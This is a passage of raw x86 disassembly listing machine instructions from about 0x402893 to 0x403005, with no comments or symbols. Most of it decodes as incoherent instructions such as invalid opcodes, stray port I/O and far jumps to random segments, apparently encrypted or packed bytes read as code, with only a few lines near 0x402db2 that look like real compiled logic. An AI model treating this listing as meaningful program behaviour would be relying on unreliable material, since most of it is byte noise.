  402893:	jle    0x4028da
  402895:	sbb    BYTE PTR [edi-0x6ee60dba],0x44
  40289c:	stos   BYTE PTR es:[edi],al
  40289d:	xchg   BYTE PTR [esi+0x5],dh
  4028a0:	mov    esi,0x9cb9e396
  4028a5:	test   al,0xc0
  4028a7:	daa    
  4028a8:	add    al,0x67
  4028aa:	cmp    eax,0xf438106f
  4028af:	add    BYTE PTR [eax+0x61990146],bh
  4028b5:	int3   
  4028b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028b7:	outs   dx,DWORD PTR ds:[esi]
  4028b8:	fiadd  WORD PTR [esi-0x3fc817c4]
  4028be:	iret   
  4028bf:	jns    0x4028d6
  4028c1:	ss stos DWORD PTR es:[edi],eax
  4028c3:	sahf   
  4028c4:	in     al,dx
  4028c5:	inc    edx
  4028c6:	outs   dx,BYTE PTR ds:[esi]
  4028c7:	int    0xf7
  4028c9:	inc    ebp
  4028ca:	aaa    
  4028cb:	call   FWORD PTR [eax-0x1cf5874a]
  4028d1:	outs   dx,BYTE PTR ds:[esi]
  4028d2:	sbb    al,0xa5
  4028d4:	imul   eax,DWORD PTR [ebp+0x7f],0x99ebd39c
  4028db:	adc    bl,BYTE PTR [ecx-0x4c0d9e85]
  4028e1:	lds    ebp,FWORD PTR [ebp+0x43]
  4028e4:	stos   DWORD PTR es:[edi],eax
  4028e5:	sub    esi,DWORD PTR [edx+0x3bccb791]
  4028eb:	push   es
  4028ec:	(bad)  
  4028ed:	sti    
  4028ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028ef:	clc    
  4028f0:	call   0x965:0xab349d79
  4028f7:	fmul   DWORD PTR [esi-0x3ae4c00]
  4028fd:	test   eax,0x3c814789
  402902:	pop    ebp
  402903:	call   DWORD PTR [esi-0x2f]
  402906:	sbb    eax,0xd0e9564c
  40290b:	xor    al,0x12
  40290d:	jnp    0x402986
  40290f:	aaa    
  402910:	adc    BYTE PTR [edi],ah
  402912:	xchg   esp,eax
  402913:	pusha  
  402914:	in     eax,dx
  402915:	bound  eax,QWORD PTR [esi+0x496d0a45]
  40291b:	mov    ds:0x737f25f1,eax
  402920:	mov    ds:0xce71a7bb,eax
  402925:	cmp    DWORD PTR ds:0x7da26fa0,0xc7f329b9
  40292f:	mov    dh,BYTE PTR [esi]
  402931:	adc    eax,eax
  402933:	jge    0x402929
  402935:	sub    esp,DWORD PTR [ecx-0x4049411b]
  40293b:	inc    ebx
  40293c:	add    eax,0xc66bdfac
  402941:	jmp    0xf095203a
  402946:	xchg   esi,eax
  402947:	bound  esi,QWORD PTR [esi]
  402949:	pop    ebx
  40294a:	and    ebp,edx
  40294c:	xchg   ebp,eax
  40294d:	hlt    
  40294e:	rcl    BYTE PTR [eax],1
  402950:	retf   0xc82
  402953:	jg     0x4029b7
  402955:	inc    ecx
  402956:	xchg   ecx,eax
  402957:	nop
  402958:	xor    dh,bl
  40295a:	daa    
  40295b:	mov    al,0x86
  40295d:	jae    0x40295a
  40295f:	out    dx,al
  402960:	mov    bl,0x74
  402962:	dec    ebx
  402963:	dec    eax
  402964:	icebp  
  402965:	add    eax,0xb172fc14
  40296a:	sbb    ebp,DWORD PTR [ebx+0x4c]
  40296d:	loope  0x402977
  40296f:	jge    0x402937
  402971:	sbb    eax,0xee6f156c
  402976:	test   BYTE PTR [ecx],ah
  402978:	inc    esi
  402979:	sbb    BYTE PTR [ebp+0x37],dh
  40297c:	icebp  
  40297d:	xchg   edi,eax
  40297e:	lds    esp,FWORD PTR [edx-0x69aed6cf]
  402984:	jae    0x4029d1
  402986:	ret    
  402987:	jcxz   0x402947
  40298a:	pop    edi
  40298b:	les    ebx,FWORD PTR [ebx]
  40298d:	xchg   esp,eax
  40298e:	call   0x944f05f9
  402993:	aaa    
  402994:	push   0x835ac27b
  402999:	fs loope 0x4029e7
  40299c:	sub    esp,esp
  40299e:	inc    edx
  40299f:	div    bh
  4029a1:	lahf   
  4029a2:	sub    eax,ecx
  4029a4:	inc    eax
  4029a5:	push   ecx
  4029a6:	mov    dl,0xc9
  4029a8:	scas   al,BYTE PTR es:[edi]
  4029a9:	test   DWORD PTR [eax+0x53],ecx
  4029ac:	sub    al,0x85
  4029ae:	test   BYTE PTR [edx+0x75],ah
  4029b1:	mov    bh,ch
  4029b3:	jmp    0x4ba75e2e
  4029b8:	mov    esp,0x3da36b4a
  4029bd:	mov    ch,BYTE PTR [ebx-0x2e]
  4029c0:	fisttp WORD PTR [edx]
  4029c2:	xchg   ecx,eax
  4029c3:	call   0x31e0:0x94764a97
  4029ca:	outs   dx,DWORD PTR ds:[esi]
  4029cb:	int    0xfa
  4029cd:	sar    DWORD PTR [edi+0x61b00721],cl
  4029d3:	int3   
  4029d4:	popa   
  4029d5:	aam    0xe7
  4029d7:	fnstenv [eax-0x4c6227d9]
  4029dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029de:	jge    0x402a4f
  4029e0:	cmp    edx,ebx
  4029e2:	mov    ch,0xf3
  4029e4:	xchg   DWORD PTR [edx],ecx
  4029e6:	inc    eax
  4029e7:	nop
  4029e8:	shl    BYTE PTR [edi+edi*1+0x2f64dd03],1
  4029ef:	jbe    0x402991
  4029f1:	lea    esi,[ecx-0x3e]
  4029f4:	adc    ch,bl
  4029f6:	add    al,0xa8
  4029f8:	stos   BYTE PTR es:[edi],al
  4029f9:	inc    ecx
  4029fa:	rcr    BYTE PTR [ebp+0x0],0x82
  4029fe:	icebp  
  4029ff:	push   ss
  402a00:	sbb    esi,DWORD PTR [edi]
  402a02:	ret    
  402a03:	dec    esi
  402a04:	jecxz  0x402a72
  402a06:	sbb    BYTE PTR [ecx+0x4d],ch
  402a09:	push   cs
  402a0a:	mov    ecx,0xe8e10af
  402a0f:	out    dx,eax
  402a10:	cmp    ah,BYTE PTR [ebp+0x2a]
  402a13:	push   ds
  402a14:	jmp    0xd983:0xe16255b9
  402a1b:	ret    0x2444
  402a1e:	ins    DWORD PTR es:[edi],dx
  402a1f:	adc    al,0xba
  402a21:	into   
  402a22:	arpl   dx,di
  402a24:	fdivp  st(3),st
  402a26:	(bad)  
  402a27:	into   
  402a28:	adc    bl,BYTE PTR [esi+0x5c]
  402a2b:	sub    eax,0x8beadd8b
  402a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a31:	xor    edx,DWORD PTR [ecx-0x3b]
  402a34:	jl     0x402aa6
  402a36:	in     eax,0x18
  402a38:	fimul  WORD PTR [eax+edx*8-0x7]
  402a3c:	dec    edi
  402a3d:	mov    ebp,0xa66f656b
  402a42:	mov    ecx,0x15a9bc3a
  402a47:	call   DWORD PTR [ebx-0x11b4c023]
  402a4d:	mov    BYTE PTR ds:0x623df4a4,ah
  402a53:	cmp    BYTE PTR [ebx],bl
  402a55:	xchg   BYTE PTR [edi+esi*4+0x5b],cl
  402a59:	imul   ecx,edi,0x9258ea04
  402a5f:	(bad)  
  402a60:	xchg   esi,eax
  402a61:	not    cl
  402a63:	mov    eax,cs
  402a65:	push   es
  402a66:	xor    BYTE PTR [ebp+0x6571797d],0x5e
  402a6d:	jmp    ecx
  402a6f:	ret    
  402a70:	push   ds
  402a71:	jecxz  0x402ac2
  402a73:	jl     0x402ae9
  402a75:	out    dx,al
  402a76:	(bad)  
  402a77:	jns    0x402adc
  402a79:	and    BYTE PTR [eax+ebx*4-0x660a4a53],bl
  402a80:	mov    eax,0x9e6f1f4c
  402a85:	pop    edi
  402a86:	pop    esi
  402a87:	jnp    0x402a56
  402a89:	aas    
  402a8a:	addr16 aam 0xff
  402a8d:	sbb    DWORD PTR [ecx],esi
  402a8f:	enter  0x28b3,0xa7
  402a93:	not    BYTE PTR [eax]
  402a95:	icebp  
  402a96:	and    eax,0x530eb002
  402a9b:	rol    BYTE PTR [ebp+0x45],0xeb
  402a9f:	and    dl,BYTE PTR [ecx-0x20995398]
  402aa5:	repz call 0x4e38a8fd
  402aab:	xlat   BYTE PTR ds:[ebx]
  402aac:	cmp    eax,DWORD PTR [ebx]
  402aae:	lods   eax,DWORD PTR ds:[esi]
  402aaf:	std    
  402ab0:	add    edx,DWORD PTR [ebx-0x7a8a3d57]
  402ab6:	jns    0x402ae5
  402ab8:	adc    ebp,esi
  402aba:	retf   
  402abb:	scas   eax,DWORD PTR es:[edi]
  402abc:	in     al,dx
  402abd:	ret    
  402abe:	adc    BYTE PTR [ebx-0x54],cl
  402ac1:	mov    al,0x62
  402ac3:	or     dh,bl
  402ac5:	mul    dl
  402ac7:	in     al,dx
  402ac8:	loopne 0x402a9e
  402aca:	sbb    BYTE PTR [esi],al
  402acc:	rol    ah,1
  402ace:	in     al,dx
  402acf:	mov    eax,0x26001768
  402ad4:	rcl    BYTE PTR [eax-0x61],1
  402ad7:	xchg   BYTE PTR [edx],ch
  402ad9:	loopne 0x402a8e
  402adb:	jp     0x402ae9
  402add:	pop    edi
  402ade:	aas    
  402adf:	sbb    esi,eax
  402ae1:	mov    eax,0x70c38a54
  402ae6:	outs   dx,BYTE PTR ds:[esi]
  402ae7:	(bad)  
  402ae8:	scas   eax,DWORD PTR es:[edi]
  402ae9:	dec    edi
  402aea:	mov    eax,0x2e2ee029
  402aef:	sbb    al,0x3c
  402af1:	cli    
  402af2:	jl     0x402ab1
  402af4:	mov    ds:0x3332d79f,eax
  402af9:	lahf   
  402afa:	push   DWORD PTR [ebx+0x493bc5be]
  402b00:	scas   al,BYTE PTR es:[edi]
  402b01:	pop    es
  402b02:	adc    esp,ecx
  402b04:	sub    BYTE PTR [esi+0x76],0x9e
  402b08:	pop    esi
  402b09:	sub    al,0x8d
  402b0b:	dec    eax
  402b0c:	jne    0x402aff
  402b0e:	lds    ebp,FWORD PTR [ebx]
  402b10:	enter  0x9ae9,0x2
  402b14:	add    BYTE PTR [eax],al
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	stos   BYTE PTR es:[edi],al
  402b23:	test   al,0xc1
  402b25:	ror    BYTE PTR [esi-0x18787ee],cl
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402b98
  402b2f:	xchg   ebx,eax
  402b30:	dec    edx
  402b31:	jno    0x402af1
  402b33:	call   0xdada:0xaaa4ca0e
  402b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b3b:	std    
  402b3c:	or     ch,BYTE PTR [eax+0x3500f2de]
  402b42:	xchg   esi,eax
  402b43:	push   cs
  402b44:	repz scas eax,DWORD PTR es:[edi]
  402b46:	jle    0x402bc1
  402b48:	inc    ebx
  402b49:	or     eax,0xc8d0c310
  402b4e:	cmp    DWORD PTR [ebx],esp
  402b50:	xchg   esi,eax
  402b51:	dec    ecx
  402b52:	xchg   ebp,eax
  402b53:	jecxz  0x402bca
  402b55:	and    al,BYTE PTR [edi]
  402b57:	xor    eax,0x4fd7f3b0
  402b5c:	mov    ds:0x8759c158,al
  402b61:	xor    ebp,DWORD PTR [ebx+0x69]
  402b64:	cli    
  402b65:	(bad)  
  402b66:	mov    ds:0xd9558730,al
  402b6b:	rol    bh,0xb7
  402b6e:	pushf  
  402b6f:	and    eax,0xa2f47bea
  402b74:	push   0xb48a1ec7
  402b79:	adc    DWORD PTR [edi+0x33],0x74a6727d
  402b80:	in     al,0x56
  402b82:	cld    
  402b83:	das    
  402b84:	xchg   DWORD PTR [esi-0x67eba588],ebp
  402b8a:	or     al,0x73
  402b8c:	xchg   ecx,eax
  402b8d:	sbb    eax,0x7356c2d
  402b92:	ins    BYTE PTR es:[edi],dx
  402b93:	mov    al,ds:0x8ada53fd
  402b98:	loop   0x402bc3
  402b9a:	xor    ecx,DWORD PTR [eax-0x5a2667ad]
  402ba0:	aam    0xe2
  402ba2:	pusha  
  402ba3:	leave  
  402ba4:	push   edi
  402ba5:	dec    esi
  402ba6:	inc    ebp
  402ba7:	add    BYTE PTR [esp+ebx*8+0x4f],0x5f
  402bac:	sbb    eax,0xb6d6c8c2
  402bb1:	mov    ah,0xab
  402bb3:	xchg   edi,esp
  402bb5:	fadd   DWORD PTR [edx-0x641422b]
  402bbb:	int    0x56
  402bbd:	mov    eax,DWORD PTR cs:[ebx+0x7a1feb52]
  402bc4:	xchg   ecx,eax
  402bc5:	xchg   edx,eax
  402bc6:	rcl    DWORD PTR [ebp+0x11],1
  402bc9:	mov    ds:0x1611997b,al
  402bce:	js     0x402b76
  402bd0:	sbb    eax,DWORD PTR [ebx+ecx*8-0x2693bce1]
  402bd7:	or     dl,0xb6
  402bda:	retf   
  402bdb:	mov    al,BYTE PTR [eax+0x7424a01d]
  402be1:	xor    dh,bh
  402be3:	ins    BYTE PTR es:[edi],dx
  402be4:	mov    ds:0xb72e0f6b,al
  402be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bea:	xchg   ebx,eax
  402beb:	sbb    ecx,DWORD PTR [esi+0x29]
  402bee:	fist   DWORD PTR [edi-0x15d05085]
  402bf4:	lea    esi,[eax-0x7d]
  402bf7:	jge    0x402c08
  402bf9:	and    cl,BYTE PTR [eax]
  402bfb:	aas    
  402bfc:	xchg   esi,eax
  402bfd:	sbb    BYTE PTR [ebx],0x4c
  402c00:	mov    esp,0xd967044e
  402c05:	call   0xda744f7e
  402c0a:	xchg   BYTE PTR [ecx+eax*1],bl
  402c0d:	pusha  
  402c0e:	pop    es
  402c0f:	sub    BYTE PTR [eax],ch
  402c11:	es jmp 0x402c73
  402c14:	dec    edi
  402c15:	dec    ecx
  402c16:	nop
  402c17:	sub    edi,ebp
  402c19:	cmp    BYTE PTR [ecx+esi*1+0x4b861f81],cl
  402c20:	cld    
  402c21:	cmc    
  402c22:	sti    
  402c23:	pop    edx
  402c24:	in     al,dx
  402c25:	out    0xe3,al
  402c27:	xchg   BYTE PTR [edi],cl
  402c29:	aad    0x8b
  402c2b:	inc    esp
  402c2c:	hlt    
  402c2d:	outs   dx,DWORD PTR ds:[esi]
  402c2e:	cdq    
  402c2f:	xor    al,0x65
  402c31:	test   BYTE PTR [ebx-0x4d],bl
  402c34:	lds    edx,FWORD PTR [eax]
  402c36:	dec    ecx
  402c37:	adc    bl,bl
  402c39:	pushf  
  402c3a:	(bad)  
  402c3b:	stc    
  402c3c:	push   ds
  402c3d:	pop    ecx
  402c3e:	pop    eax
  402c3f:	mov    ecx,0x5c834915
  402c44:	ror    dl,0xc8
  402c47:	mov    bh,0xb8
  402c49:	pushf  
  402c4a:	xchg   ecx,eax
  402c4b:	sti    
  402c4c:	lods   al,BYTE PTR ds:[esi]
  402c4d:	(bad)  
  402c4e:	xchg   ebx,eax
  402c4f:	add    esi,esp
  402c51:	mov    eax,ds:0xe616fd5f
  402c56:	mov    ch,0xa6
  402c58:	jne    0x402c7e
  402c5a:	dec    edi
  402c5b:	(bad)  ds:0xc08b5261
  402c61:	and    esi,edx
  402c63:	and    al,0xb
  402c65:	int3   
  402c66:	push   esi
  402c67:	mov    esi,ebp
  402c69:	test   al,0xd
  402c6b:	xchg   ecx,eax
  402c6c:	xor    DWORD PTR [eax-0x2d],edi
  402c6f:	xor    al,0xd7
  402c71:	pop    edx
  402c72:	pop    esp
  402c73:	adc    ch,0xb9
  402c76:	outs   dx,DWORD PTR ds:[esi]
  402c77:	loope  0x402c25
  402c79:	mov    esp,0x1e11b4df
  402c7e:	cmp    ah,BYTE PTR [ebx+0x50]
  402c81:	inc    esi
  402c82:	xor    BYTE PTR [edi-0x41],al
  402c85:	es mov ecx,0x459ef47d
  402c8b:	sbb    eax,0x852435f6
  402c90:	dec    edi
  402c91:	cmp    edx,DWORD PTR [eax+0x2d]
  402c94:	xor    ah,BYTE PTR [ebp+0x31]
  402c97:	jo     0x402c49
  402c99:	jnp    0x402cad
  402c9b:	std    
  402c9c:	jne    0x402cec
  402c9e:	jle    0x402d1c
  402ca0:	jmp    FWORD PTR [edx+0x35]
  402ca3:	fbld   TBYTE PTR ds:0x7af37aa9
  402ca9:	jb     0x402d11
  402cab:	aas    
  402cac:	sbb    eax,0xff601229
  402cb1:	jle    0x402cb1
  402cb3:	and    eax,esp
  402cb5:	(bad)  
  402cb6:	data16 aam 0x26
  402cb9:	outs   dx,BYTE PTR ds:[esi]
  402cba:	xchg   edi,eax
  402cbb:	jnp    0x402ca2
  402cbd:	lea    edi,[edi-0xc]
  402cc0:	mov    eax,0x5569d676
  402cc5:	jecxz  0x402c60
  402cc7:	std    
  402cc8:	scas   al,BYTE PTR es:[edi]
  402cc9:	or     BYTE PTR [esi+0x63],ch
  402ccc:	xchg   edi,eax
  402ccd:	aaa    
  402cce:	pop    ss
  402ccf:	popf   
  402cd0:	xor    eax,edx
  402cd2:	bound  edx,QWORD PTR cs:[ecx+0x6aecbd52]
  402cd9:	inc    edi
  402cda:	lods   ax,WORD PTR ds:[esi]
  402cdc:	popa   
  402cdd:	and    eax,0xc36b5584
  402ce2:	mov    al,0xe3
  402ce4:	call   0x33c3:0x9eed67e5
  402ceb:	push   ds
  402cec:	in     al,dx
  402ced:	inc    ecx
  402cee:	xchg   esi,eax
  402cef:	ss std 
  402cf1:	cmp    ecx,DWORD PTR [ebp+0x68]
  402cf4:	or     eax,0x2f2b44b2
  402cf9:	mov    bh,0xe8
  402cfb:	jg     0x402c93
  402cfd:	inc    esp
  402cfe:	push   ss
  402cff:	xor    BYTE PTR [edi-0x7],bl
  402d02:	bound  edx,QWORD PTR [ebx+0x36]
  402d05:	inc    eax
  402d06:	stc    
  402d07:	(bad)  
  402d08:	sti    
  402d09:	xor    esp,edi
  402d0b:	and    dl,ah
  402d0d:	xor    BYTE PTR [esi],cl
  402d0f:	push   esp
  402d10:	lock daa 
  402d12:	mov    bl,0x9a
  402d14:	int    0x6c
  402d16:	sub    BYTE PTR [ebx+0x55],0xf8
  402d1a:	mov    es,WORD PTR [esi]
  402d1c:	es inc eax
  402d1e:	xchg   edi,eax
  402d1f:	ret    0x7ac2
  402d22:	mov    ebp,0xcc064f38
  402d27:	pop    ebx
  402d28:	xchg   esi,eax
  402d29:	data16 jb 0x402d8a
  402d2c:	xchg   esi,eax
  402d2d:	lds    ebx,FWORD PTR [edi]
  402d2f:	push   ecx
  402d30:	jne    0x402d0e
  402d32:	add    BYTE PTR [eax+0x7b5c7a03],al
  402d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d3a:	sahf   
  402d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d3c:	pop    edi
  402d3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d3e:	ins    DWORD PTR es:[edi],dx
  402d3f:	(bad)  
  402d40:	push   ebx
  402d41:	sub    al,BYTE PTR [ebx]
  402d43:	push   ebx
  402d44:	mov    esi,0xf6c27f33
  402d49:	pusha  
  402d4a:	mov    bh,0xe9
  402d4c:	and    al,0xc2
  402d4e:	stc    
  402d4f:	add    ebp,DWORD PTR [edx+0x7f]
  402d52:	cmp    DWORD PTR [ecx],edx
  402d54:	test   DWORD PTR [ebx-0x7b18d812],esi
  402d5a:	pop    eax
  402d5b:	inc    eax
  402d5c:	data16 jg 0x402d59
  402d5f:	das    
  402d60:	mov    ch,BYTE PTR [esi+0x70]
  402d63:	fcomp  DWORD PTR [ebp-0x26aeb3ad]
  402d69:	loopne 0x402d7f
  402d6b:	sahf   
  402d6c:	sti    
  402d6d:	xlat   BYTE PTR ds:[ebx]
  402d6e:	test   al,0xcc
  402d70:	fwait
  402d71:	xchg   esi,eax
  402d72:	fs stos BYTE PTR es:[edi],al
  402d74:	aam    0xa8
  402d76:	mov    eax,ds:0x3acd7a7
  402d7b:	ret    
  402d7c:	xchg   ecx,eax
  402d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d7e:	jg     0x402dda
  402d80:	push   eax
  402d81:	ror    DWORD PTR [esi],1
  402d83:	fs loopne 0x402d88
  402d86:	jmp    0xbbb0:0x905761f6
  402d8d:	sbb    ah,dl
  402d8f:	xchg   ebp,eax
  402d90:	or     al,0x26
  402d92:	and    al,0x8
  402d94:	repz xor DWORD PTR [eax+0x3eeec27e],ebx
  402d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d9c:	or     al,0xbe
  402d9e:	xlat   BYTE PTR ds:[ebx]
  402d9f:	pop    eax
  402da0:	cli    
  402da1:	and    eax,0xaff6408e
  402da6:	iret   
  402da7:	fcmove st,st(1)
  402da9:	mov    ds:0xbbda89d1,eax
  402dae:	icebp  
  402daf:	cmp    DWORD PTR [ebx],ebp
  402db1:	iret   
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402df3:	ret    0x214e
  402df6:	or     al,0x17
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402db0
  402dff:	xor    BYTE PTR [edi+0x6217870a],al
  402e05:	popa   
  402e06:	push   esp
  402e07:	imul   ecx,DWORD PTR [ebp-0x23],0xffffffb2
  402e0b:	lods   al,BYTE PTR ds:[esi]
  402e0c:	adc    al,0x8a
  402e0e:	mov    ch,0xf
  402e10:	out    dx,eax
  402e11:	out    dx,eax
  402e12:	push   es
  402e13:	cmp    eax,0xb1529e0f
  402e18:	cmp    al,0x19
  402e1a:	out    0x2,al
  402e1c:	sub    al,0x2
  402e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e1f:	xchg   esp,eax
  402e20:	dec    BYTE PTR [ebp+0x2]
  402e23:	mov    bh,ah
  402e25:	and    al,0xfd
  402e27:	lahf   
  402e28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e29:	aam    0x83
  402e2b:	push   es
  402e2c:	sub    eax,0x673410ac
  402e31:	add    eax,0x7144e5ab
  402e36:	mov    ah,dh
  402e38:	adc    eax,0xd15e966a
  402e3d:	mov    edx,0xaabecdca
  402e42:	cmp    DWORD PTR [esi+0x6da1791e],edi
  402e48:	call   0xf3d5:0x25db6ddd
  402e4f:	dec    ebx
  402e50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e51:	fs out 0xa,al
  402e54:	jp     0x402e60
  402e56:	lods   eax,DWORD PTR ds:[esi]
  402e57:	loopne 0x402e97
  402e59:	(bad)  
  402e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e5b:	jbe    0x402ec6
  402e5d:	adc    eax,0xd71d8e49
  402e62:	jecxz  0x402ea0
  402e64:	(bad)  
  402e65:	in     eax,0xb7
  402e67:	cmp    BYTE PTR [ebp+0x54],dl
  402e6a:	pop    ebx
  402e6b:	sub    dl,dl
  402e6d:	xchg   ebp,eax
  402e6e:	fs int3 
  402e70:	add    DWORD PTR [edi],0x1d519e9e
  402e76:	push   0x45b9cf86
  402e7b:	ja     0x402e66
  402e7d:	fidivr DWORD PTR [eax-0x51768a32]
  402e83:	sbb    DWORD PTR [edx+edx*2+0x5e],edx
  402e87:	mov    bh,0x54
  402e89:	lahf   
  402e8a:	push   esi
  402e8b:	into   
  402e8c:	jns    0x402e63
  402e8e:	fwait
  402e8f:	dec    edx
  402e90:	cmp    esp,DWORD PTR [esi+0x45]
  402e93:	imul   esp,DWORD PTR [esi],0x84b7a5f1
  402e99:	outs   dx,DWORD PTR ds:[esi]
  402e9a:	and    DWORD PTR [ebx],esi
  402e9c:	dec    edi
  402e9d:	add    bl,BYTE PTR [eax-0x41]
  402ea0:	mov    al,0xce
  402ea2:	cmp    ecx,DWORD PTR [edi-0x8677a57]
  402ea8:	push   es
  402ea9:	ret    
  402eaa:	aas    
  402eab:	loop   0x402f20
  402ead:	ins    DWORD PTR es:[di],dx
  402eaf:	adc    cl,bh
  402eb1:	ins    DWORD PTR es:[edi],dx
  402eb2:	adc    eax,DWORD PTR [esi]
  402eb4:	pushf  
  402eb5:	ja     0x402ee8
  402eb7:	sbb    DWORD PTR [ecx-0x14],ebp
  402eba:	jl     0x402f24
  402ebc:	sub    eax,0x8f05b33e
  402ec1:	fisub  DWORD PTR [eax-0x64e4fa0b]
  402ec7:	ins    DWORD PTR es:[edi],dx
  402ec8:	ss push edi
  402ecb:	push   ds
  402ecc:	ds mov ebp,0x852fb48e
  402ed2:	or     al,dh
  402ed4:	push   esi
  402ed5:	dec    eax
  402ed6:	dec    edi
  402ed7:	xor    eax,0xb36b4427
  402edc:	hlt    
  402edd:	lods   eax,DWORD PTR ds:[esi]
  402ede:	cdq    
  402edf:	fcmovu st,st(4)
  402ee1:	or     eax,esp
  402ee3:	or     edi,DWORD PTR [esi+0x7d4fc895]
  402ee9:	sub    al,BYTE PTR [ebp+0x14cd5b12]
  402eef:	mov    ds:0x63a13aa5,al
  402ef4:	dec    eax
  402ef5:	mov    ds:0xb4cc5349,eax
  402efa:	fwait
  402efb:	xchg   edi,eax
  402efc:	jb     0x402ef6
  402efe:	iret   
  402eff:	xlat   BYTE PTR ds:[ebx]
  402f00:	imul   ebx,DWORD PTR [ebx-0x5cfee2fd],0xc
  402f07:	push   esi
  402f08:	jp     0x402f48
  402f0a:	or     ebp,DWORD PTR [ecx+0x4aeb1879]
  402f10:	imul   DWORD PTR [edx-0xbf57d6e]
  402f16:	dec    ebx
  402f17:	rcr    DWORD PTR ds:0x8bc5f898,0xea
  402f1e:	jmp    0xf66d:0xfe906fe2
  402f25:	adc    DWORD PTR [edx],ebp
  402f27:	xor    edx,DWORD PTR [eax]
  402f29:	repnz dec esp
  402f2b:	jb     0x402f78
  402f2d:	xor    edx,0x77c4e9f
  402f33:	adc    BYTE PTR [esi+0xa],bl
  402f36:	fldenv ds:0xc373ac9
  402f3c:	shl    al,1
  402f3e:	repnz dec ecx
  402f40:	lock adc eax,0x303932f8
  402f46:	push   es
  402f47:	push   ds
  402f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f49:	stos   BYTE PTR es:[edi],al
  402f4a:	lock lods ax,WORD PTR ds:[esi]
  402f4d:	or     al,0xf4
  402f4f:	ret    0x1524
  402f52:	adc    ch,dh
  402f54:	mov    eax,0x26213212
  402f59:	fwait
  402f5a:	cmp    al,0x1a
  402f5c:	icebp  
  402f5d:	shl    ah,1
  402f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f60:	leave  
  402f61:	into   
  402f62:	sub    ebp,ebp
  402f64:	retf   
  402f65:	cmc    
  402f66:	fbstp  TBYTE PTR [edi-0xefd516e]
  402f6c:	dec    ebp
  402f6d:	mov    ebp,0xdbc3f9d6
  402f72:	dec    ebx
  402f73:	out    0x27,al
  402f75:	sub    al,BYTE PTR [esi]
  402f77:	cmp    eax,0xbed2abf2
  402f7c:	add    al,0x5
  402f7e:	sbb    al,ah
  402f80:	xlat   BYTE PTR ds:[ebx]
  402f81:	pusha  
  402f82:	mov    ecx,0x5787bf8b
  402f87:	jae    0x402faa
  402f89:	or     BYTE PTR [eax+0x76],0xb9
  402f8d:	jnp    0x402faa
  402f8f:	popf   
  402f90:	or     BYTE PTR [ecx+0x237c72bf],bh
  402f96:	dec    edi
  402f97:	mov    eax,ds:0x3f42ccb0
  402f9c:	push   edi
  402f9d:	ror    DWORD PTR ds:0x2f32a3e2,0x70
  402fa4:	not    DWORD PTR [ebp+0x2d]
  402fa7:	outs   dx,BYTE PTR ds:[esi]
  402fa8:	mov    eax,0xa4f515c7
  402fad:	and    eax,0xe207422a
  402fb2:	cmp    al,0xae
  402fb4:	sub    DWORD PTR [edi+esi*2+0x72],0x617a2051
  402fbc:	xchg   edx,eax
  402fbd:	cmc    
  402fbe:	pop    esp
  402fbf:	nop
  402fc0:	aas    
  402fc1:	rol    BYTE PTR [ebp-0x15],0x47
  402fc5:	js     0x40300d
  402fc7:	enter  0xa561,0xfe
  402fcb:	out    0x89,eax
  402fcd:	shl    BYTE PTR [ebp+0x31d9f5d3],cl
  402fd3:	xchg   ecx,eax
  402fd4:	pop    es
  402fd5:	sub    ch,BYTE PTR [ecx-0x6b0abce5]
  402fdb:	jb     0x403002
  402fdd:	sub    dh,cl
  402fdf:	in     al,dx
  402fe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fe1:	fwait
  402fe2:	ret    
  402fe3:	and    esi,DWORD PTR [esi+0x44]
  402fe6:	lds    esi,FWORD PTR [edx+0x4e]
  402fe9:	lea    edi,[edi-0x79]
  402fec:	mov    edi,0x6dd24034
  402ff1:	xchg   edi,eax
  402ff2:	fsub   st(2),st
  402ff4:	pop    eax
  402ff5:	sahf   
  402ff6:	std    
  402ff7:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ff9:	xchg   ebp,eax
  402ffa:	loopne 0x402fd2
  402ffc:	icebp  
  402ffd:	out    dx,al
  402ffe:	test   al,dl
  403000:	aas    
  403001:	jae    0x402ff0
  403003:	leave  
  403004:	inc    esi
  403005:	or     BYTE PTR [eax],0xcf
